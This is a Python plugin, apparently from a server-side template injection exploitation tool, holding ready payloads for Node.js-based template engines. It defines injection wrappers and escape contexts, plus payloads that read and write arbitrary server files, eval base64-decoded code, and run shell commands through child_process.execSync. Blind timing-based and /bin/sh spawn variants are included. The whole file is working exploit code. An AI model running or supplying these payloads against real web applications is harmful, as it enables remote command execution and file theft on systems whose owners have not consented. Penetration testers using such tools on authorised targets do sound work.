from plugins.languages import javascript
from utils import rand

# TODO: process.mainModule may be undefined, needs replacement
class Javascript_generic(javascript.Javascript):
    priority = 9
    plugin_info = {
        "Description": """Template engines with JavaScript statement evaluation in tags""",
        "Usage notes": "This plugin can be used to speed up detection in simple contexts as well as for covering more of such engines.",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'header': """{header[0]}+{header[1]}""",
                'trailer': """{trailer[0]}+{trailer[1]}""",
                'render': '{code}',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'write': {
                'write': """global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                'truncate': """global.process.mainModule.require('fs').writeFileSync('{path}', '')"""
            },
            'read': {
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'evaluate': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """global.process.mainModule.require('os').platform()"""
                #'test_os': """process.platform"""
            },
            'execute_blind': {
                'execute_blind': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"""
                #'execute_blind': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}'], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
            'execute': {
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
                #'execute': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0, 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "<%={code}%>"]},
            {'level': 0, 'wrappers': ["#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "\n={code}\n"]},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{',
             'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{',
             'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${',
             'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'wrappers': ["<%={code}>"], 'suffix': '<%=',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{=',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{=',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n=',
             'closures': javascript.ctx_closures},
            {'level': 3, 'prefix': '{closure}%}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}",
                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%',
             'closures': javascript.ctx_closures},
            # Comments
            {'level': 4, 'prefix': '*}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"],
             'suffix': '{*'},
            {'level': 4, 'prefix': '#}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"],
             'suffix': '{#'},
        ])
